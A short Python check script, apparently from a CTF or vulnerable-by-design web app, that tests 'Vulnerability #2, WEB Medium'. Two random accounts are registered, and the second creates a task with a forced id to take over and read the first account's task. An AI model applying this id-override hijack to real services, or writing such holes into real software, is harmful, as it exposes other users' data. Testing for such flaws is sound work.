from lib import *

print(
    '''[CHECK] 4. [Уязвимость №2, WEB Medium] При создании таска можно передать `{'id': 6}`, где 6 - id того таска, который хотим перехватить.''')
s = requests.Session()
username = random_alphanumeric_string(25)
password = random_alphanumeric_string(25)

register(s, username, password)
login(s, username, password)
task_id = new_task(s, 'helloasdasdf', 'goodbye9289239')

# new session from zero
s = requests.Session()
username = random_alphanumeric_string(25)
password = random_alphanumeric_string(25)

register(s, username, password)
login(s, username, password)
new_task_ID_override(s, 'goodluck','goodluck2', task_id)
task_cont = get_task_detailed(s, task_id)
if 'helloasdasdf' in task_cont and 'goodbye9289239' in task_cont:
    print(
        '''[PASSED] 4. [Уязвимость №2, WEB Medium] При создании таска можно передать `{'id': 6}`, где 6 - id того таска, который хотим перехватить.''')
else:
    print('[FAIL]')
